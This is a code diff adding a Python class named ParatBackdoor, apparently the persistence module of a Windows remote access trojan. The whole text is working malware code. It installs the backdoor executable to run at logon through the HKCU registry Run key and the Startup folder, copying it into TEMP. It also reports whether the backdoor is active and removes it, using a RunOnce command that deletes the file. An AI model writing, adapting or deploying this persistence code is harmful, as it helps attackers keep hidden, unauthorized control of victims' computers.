@@ -1,0 +1,101 @@
+class ParatBackdoor:
+
+	def __init__(self):
+		pass
+
+
+	def is_installed(self, method):
+
+		if method == 'reg':
+
+			query = "reg query HKCU\Software\Microsoft\Windows\Currentversion\Run /f %s" % SERVICE_NAME
+
+			output = os.popen(query)
+
+			if SERVICE_NAME in output.read():
+				return True
+			else:
+				return False
+
+		if method == 'sup':
+
+			validation = os.environ["APPDATA"] + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + EXECUTABLE_NAME
+
+			if os.path.isfile(validation):
+				return True
+			else:
+				return False
+
+
+
+	def do_action(self, action):
+
+		if action == "registry":
+
+			if not self.is_installed('reg'):
+
+				add_command = "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run" + \
+							  " /f /v %s /t REG_SZ /d %s" % (SERVICE_NAME, os.environ["TEMP"] + '\\' + EXECUTABLE_NAME)
+				stdin, stdout, stderr = os.popen3(add_command)
+				copyfile(EXECUTABLE_PATH, os.environ["TEMP"] + "/" + EXECUTABLE_NAME)
+
+			return "[92m[+][0m Persistence installed.\n"
+
+
+		if action == "startup":
+
+			if not self.is_installed('sup'):
+				copy2(EXECUTABLE_NAME, os.environ["APPDATA"] + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\")
+
+			return "[92m[+][0m Persistence installed.\n"
+
+
+		elif action == "remove":
+
+			reg_rem, sup_rem = False, False
+
+			if self.is_installed('reg'):
+
+				Popen("reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v %s" % SERVICE_NAME, shell=False)
+				Popen("reg add HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce /f /v %s /t REG_SZ /d %s" % \
+							(SERVICE_NAME, '"cmd.exe /c del %USERPROFILE%\\"' + EXECUTABLE_NAME), shell=False)
+				reg_rem = True
+
+			if self.is_installed('sup'):
+				os.remove(os.environ["APPDATA"] + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + EXECUTABLE_NAME)
+				sup_rem = True
+
+
+			if reg_rem and sup_rem:
+				return "[92m[+][0m Registry and Startup persistences removed.\n"
+
+			elif reg_rem:
+				return "[92m[+][0m Registry persistence removed.\n"
+
+			elif sup_rem:
+				return "[92m[+][0m Startup persistence removed.\n"
+
+
+
+		elif action == "status":
+
+			registry, startup = False, False
+
+			if self.is_installed('reg'):
+				registry = True
+
+			if self.is_installed('sup'):
+				startup = True
+
+
+			if registry and startup:
+				return "[92m[+][0m registry and startup backdoor are [92menable[0m.\n"
+
+			elif registry:
+				return "[92m[+][0m registry backdoor is [92menable[0m.\n"
+
+			elif startup:
+				return "[92m[+][0m startup backdoor is [92menable[0m.\n"
+
+			else:
+				return "[92m[+][0m Persistence is [31mdisable[0m.\n"
